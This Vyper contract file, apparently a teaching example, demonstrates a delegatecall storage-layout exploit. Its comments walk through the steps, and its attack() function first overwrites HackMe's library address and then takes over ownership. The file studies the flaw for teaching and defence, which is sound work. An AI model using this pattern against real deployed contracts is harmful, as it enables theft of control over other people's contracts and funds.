# This is a more sophisticated version of the previous exploit.
#
# 1. Alice deploys Lib and HackMe with the address of Lib
# 2. Eve deploys Attack with the address of HackMe
# 3. Eve calls Attack.attack()
# 4. Attack is now the owner of HackMe
#
# What happened?
# Notice that the state variables are not defined in the same manner in Lib
# and HackMe. This means that calling Lib.doSomething() will change the first
# state variable inside HackMe, which happens to be the address of lib.
#
# Inside attack(), the first call to doSomething() changes the address of lib
# store in HackMe. Address of lib is now set to Attack.
# The second call to doSomething() calls Attack.doSomething() and here we
# change the owner.

# Make sure the storage layout is the same as HackMe
# This will allow us to correctly update the state variables

import hack_me as HackMe

lib: public(address)
owner: public(address)
someNumber: public(uint256)

hackMe: public(HackMe)

@deploy
def __init__(_hackMe: address):
    self.hackMe = HackMe(_hackMe)

@external
def attack():
    # override address of lib
    self.hackMe.doSomething(convert(self, uint256))
    # pass any number as input, the function doSomething() below will
    # be called
    self.hackMe.doSomething(1)

# function signature must match HackMe.doSomething()
@external
def doSomething(_num: uint256):
    self.owner = msg.sender
